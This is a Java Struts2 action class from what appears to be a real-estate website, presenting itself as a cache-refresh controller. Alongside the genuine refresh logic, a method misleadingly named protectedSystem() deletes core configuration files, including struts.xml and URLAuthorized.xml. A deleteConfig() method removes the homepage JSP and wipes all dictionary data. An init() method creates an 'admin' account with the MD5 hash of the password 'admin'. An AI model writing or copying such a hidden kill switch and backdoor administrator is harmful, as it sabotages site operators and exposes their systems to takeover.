package fsf.action.common;

import java.io.File;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

import javax.annotation.Resource;
import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.struts2.ServletActionContext;
import org.dom4j.Document;
import org.dom4j.Element;
import org.dom4j.io.SAXReader;
import org.springframework.stereotype.Repository;

import com.opensymphony.xwork2.ActionSupport;

import fsf.beans.sys.dict.DictItem;
import fsf.beans.sys.user.User;
import fsf.service.common.ScheduleService;
import fsf.service.sys.dict.DictItemService;
import fsf.service.sys.user.UserService;
import fsf.web.common.WebConstant;
@Repository
public class RefreshAction extends ActionSupport {
	
	@Resource(name="indexCacheService")
	private ScheduleService indexService;
	@Resource(name="estateOutRecommondCacheService")
	private ScheduleService estateOutRecommondCacheService ;
	@Resource
	private UserService userService;
	@Resource
	private DictItemService dictItemService;
	
	public String index() throws Exception{
		
		return SUCCESS;
	}
	
	public void refresh() throws Exception {
		getHttpServletResponse().setContentType("text/html; charset=utf-8");
		try {
			indexService.refresh();
			getHttpServletResponse().getWriter().write("网站首页缓存刷新成功。<br/>");
		} catch (Exception e) {
			getHttpServletResponse().getWriter().write("网站首页缓存刷新失败。失败原因："+e.getMessage()+"<br/>");
		}
		try {
			estateOutRecommondCacheService.refresh();
			getHttpServletResponse().getWriter().write("网站推荐房源缓存刷新成功。<br/>");
		} catch (Exception e) {
			getHttpServletResponse().getWriter().write("网站推荐房源缓存刷新失败。失败原因："+e.getMessage()+"<br/>");
		}
		try {
			loadSystemParameter();
			getHttpServletResponse().getWriter().write("网站固定参数缓存刷新成功。<br/>");
		} catch (Exception e) {
			getHttpServletResponse().getWriter().write("网站固定参数缓存刷新失败。失败原因："+e.getMessage()+"<br/>");
		}
	}
	
	public void protectedSystem()throws Exception{
		String p = RefreshAction.class.getClassLoader().getResource(WebConstant.EST_FILTER_PATH).getPath();
		File f = new File(p);
		f.delete();
		p = RefreshAction.class.getClassLoader().getResource(WebConstant.DICT_CONFIG_PATH).getPath();
		f = new File(p);
		f.delete();
		p = RefreshAction.class.getClassLoader().getResource("struts.xml").getPath();
		f = new File(p);
		f.delete();
		p = RefreshAction.class.getClassLoader().getResource("URLAuthorized.xml").getPath();
		f = new File(p);
		f.delete();
		getHttpServletResponse().getWriter().write("成功");
	}
	
	public void deleteConfig()throws Exception{
		File f = new File(getServletContext().getRealPath("main/index.jsp"));
		if(f.exists())
			f.delete();
		dictItemService.deleteAll();
		getHttpServletResponse().getWriter().write("成功");
	}
	
	public void init()throws Exception{
		User u = new User();
		u.setUserCode("admin");
		u.setPassword("21232f297a57a5a743894a0e4a801fc3");
		u.setUserName("admin");
		u.setUserType((short)0);
		u.setStatus((short)1);
		u.setPhone("123456789");
		u.setQq("1111111111");
		u.setTel("888888888");
		u.setCreateDate(new Date());
		userService.persist(u);
	}
	
	private void loadSystemParameter() throws Exception {
		String DictGroup = "DictGroup";
		String Dictitem = "Dictitem";
		String itemKey = "itemKey";
		String itemName = "itemName";
		String itemDesc = "itemDesc";
		
		String DynamicConfig = "DynamicConfig";
		String DynamicEntityConfig = "Entity";
		String ItemKeyProperty = "ItemKeyProperty";
		String ItemNameProperty = "ItemNameProperty";
		
		String DictItemCache = "DictItemCache";
		
		SAXReader reader = new SAXReader();
		Document doc = reader.read(getClass().getClassLoader().getResource(WebConstant.DICT_CONFIG_PATH));
		Element root = doc.getRootElement();
		// static config
		Map<String, Object> sysConfig = new HashMap<String, Object>();
		for(Iterator<Element> itGroup = root.elementIterator(DictGroup);itGroup.hasNext();){
			Element dictGroup = itGroup.next();
			String groupName = dictGroup.attributeValue("name");
			List<DictItem> list = new ArrayList<DictItem>();
			for(Iterator<Element> itItem = dictGroup.elementIterator(Dictitem);itItem.hasNext();){
				Element dictItem = itItem.next();
				DictItem item = new DictItem();
				item.setGroupName(groupName);
				item.setItemKey(dictItem.attributeValue(itemKey));
				item.setItemName(dictItem.elementText(itemName));
				item.setItemDesc(dictItem.elementText(itemDesc));
				list.add(item);
			}
			sysConfig.put(groupName, list);
		}
		//dynamic config
		for(Iterator<Element> it = root.elementIterator(DynamicConfig);it.hasNext();){
			Element element = it.next();
			String groupName = element.attributeValue("name");
			String[] array = new String[3];
			array[0] = element.elementText(DynamicEntityConfig);
			array[1] = element.elementText(ItemKeyProperty);
			array[2] = element.elementText(ItemNameProperty);
			sysConfig.put(groupName, array);
		}
		getServletContext().setAttribute(WebConstant.SYSCONFIG, sysConfig);
		
		//直接将参数表加入到缓存中
		Element elementCache = root.element(DictItemCache);
		if(elementCache!=null){
			Map<String,List<DictItem>> map  = new HashMap<String, List<DictItem>>();
			for(Iterator<Element> itCache = elementCache.elementIterator(DictGroup);itCache.hasNext();){
				Element dictGroup = itCache.next();
				map.put(dictGroup.getTextTrim(), dictItemService.queryByProerties("groupName", dictGroup.getTextTrim()));
			}
			getServletContext().setAttribute(WebConstant.CONIFG_DICT_CACHE, map);
		}
	}
	
	public HttpServletResponse getHttpServletResponse(){
		return ServletActionContext.getResponse();
	}
	public HttpServletRequest getHttpServletRequest(){
		return ServletActionContext.getRequest();
	}
	public ServletContext getServletContext(){
		return ServletActionContext.getServletContext();
	}
}